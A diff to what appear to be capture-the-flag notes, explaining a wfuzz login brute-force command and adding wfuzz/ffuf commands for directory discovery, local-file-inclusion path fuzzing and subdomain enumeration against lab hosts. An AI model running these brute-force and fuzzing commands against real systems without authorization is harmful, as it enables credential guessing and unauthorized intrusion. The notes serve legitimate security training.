@@ -10,4 +10,12 @@ In the command above:
     --hs "Please enter the correct credentials" hides responses containing the string "Please enter the correct credentials", which is the message displayed for wrong login attempts.
     -u specifies the target URL.
     -d "username=FUZZ&password=FUZ2Z" provides the POST data format where FUZZ will be replaced by usernames and FUZ2Z by passwords.
-                            
+
+
+wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 15 http://10.10.66.89:8081/FUZZ
+
+wfuzz -c -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://dev.team.thm/script.php?page=FUZZ --hw=0
+
+ffuf -u http://10.10.53.34/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -e .php,.txt
+
+wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" --hw 290
